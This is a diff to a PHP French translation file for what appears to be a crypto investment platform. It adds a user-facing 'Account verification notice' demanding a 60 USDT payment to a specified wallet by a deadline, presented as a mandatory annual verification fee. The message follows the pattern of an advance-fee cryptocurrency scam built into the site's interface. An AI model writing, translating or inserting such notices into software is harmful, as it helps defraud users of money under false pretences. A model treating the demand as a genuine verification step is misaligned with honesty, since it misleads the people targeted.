@@ -115,4 +115,16 @@ return [
     'Investment' => 'Investissement',
     'Wallet Address' => 'Adresse du portefeuille',
     'Virtual' => 'Virtuel',
+    'Logout' => 'Déconnexion',
+    'Account verification notice' => <<<'TEXT'
+Chers partenaires!
+
+Pour le bon fonctionnement de la plate-forme et la possibilité de traiter tous les paiements et remboursements, il est important d'avoir des données utilisateur précises et à jour.
+
+À cet égard, il est nécessaire de terminer la procédure de vérification du compte. Il nécessite un paiement de 60 USDT au portefeuille spécifié ici, après quoi votre compte sera activé et le système recevra les données nécessaires pour le traitement correct des paiements.
+
+Ces fonds visent à soutenir le fonctionnement stable du site et l'identification des utilisateurs, garantissant la protection des comptes et les maintenir au courant.
+
+Le paiement doit être effectué d'ici le 20 septembre. Cette procédure est obligatoire et est facturée chaque année.
+TEXT,
 ];
